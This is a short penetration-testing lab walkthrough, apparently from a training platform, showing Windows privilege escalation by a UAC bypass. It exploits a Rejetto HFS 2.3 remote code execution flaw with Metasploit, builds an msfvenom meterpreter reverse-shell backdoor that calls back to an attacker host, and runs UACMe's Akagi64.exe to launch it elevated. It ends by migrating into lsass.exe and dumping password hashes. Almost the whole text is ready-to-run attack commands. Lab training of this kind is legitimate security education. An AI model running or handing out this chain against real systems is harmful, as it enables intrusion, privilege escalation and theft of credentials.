# UAC Bypass: UACMe

Advance Privilege Escalation: Windows: UAC Bypass

nmap

```bash
nmap -sV -p 80 10.0.27.103
```

We will search the exploit module for hfs file server using searchsploit.

```bash
searchsploit hfs
```

Rejetto HTTP File Server (HFS) 2.3 is vulnerable to RCE. Exploiting the target server using the Metasploit framework.

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.27.103
exploit
```

Checking the current user.

```bash
getuid
sysinfo
```

We can observe that we are running as an admin user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process to the explorer process.

```bash
ps -S explorer.exe
migrate 2444
#Elevate to the high privilege
getsystem
```

Get a windows shell and check if the admin user is a member of the Administrators group.

```bash
shell
net localgroup administrators
```

Generating malicious executable using msfvenom and running it on the target machine to gain administrator user privileges.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'
file "backdoor.exe"
```

Switch the directory to the userâ€™s temp folder and upload the Akagi64.exe and backdoor.exe executable.

```bash
exit
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
```

Start another msfconsole and run a multi handler.

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.1.3
set LPORT 4444
exploit
```

Switch back to the meterpreter and run the Akagi64.exe executable.

```bash
shell
.\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

Migrate in lsass.exe process

```bash
ps -S lsass.exe
migrate 680
```

Dump the hashes.

```bash
hashdump
```
